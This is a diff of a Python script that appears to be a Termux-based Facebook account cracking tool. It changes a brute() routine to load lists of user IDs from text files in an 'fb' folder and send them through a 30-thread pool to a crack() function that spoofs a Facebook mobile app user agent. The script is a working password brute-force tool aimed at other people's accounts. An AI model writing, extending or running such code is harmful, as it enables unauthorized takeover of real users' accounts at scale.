@@ -83,8 +83,16 @@ useragents = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; w
 
 
 def brute():
-    self.id = open('public.json', 'r').read().splitlines()
-    jalan;time.sleep(0.2)
+        raw_input('\nENTER to CRACK')
+        try:
+            path = r'/data/data/com.termux/files/home/fb'
+            self.apk = random.choice(glob.glob(path + r'/*.txt'))
+            self.id = open(self.apk).read().splitlines()
+            print('\nFile: %s'%(self.apk))
+        except:
+            print('\nCOMPLETE')
+            os.sys.exit()
+        jalan;time.sleep(0.2)
     with ThreadPoolExecutor(max_workers=30) as NEMO:
         for omen in self.id:
             try:
@@ -98,8 +106,7 @@ def brute():
             except:
                 pass
 
-    os.system("rm -rf public.json")
-    sys.exit()
+    os.remove(self.apk);time.sleep(2)
 
 def crack(uid, pwx, host, **kwargs):
 	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
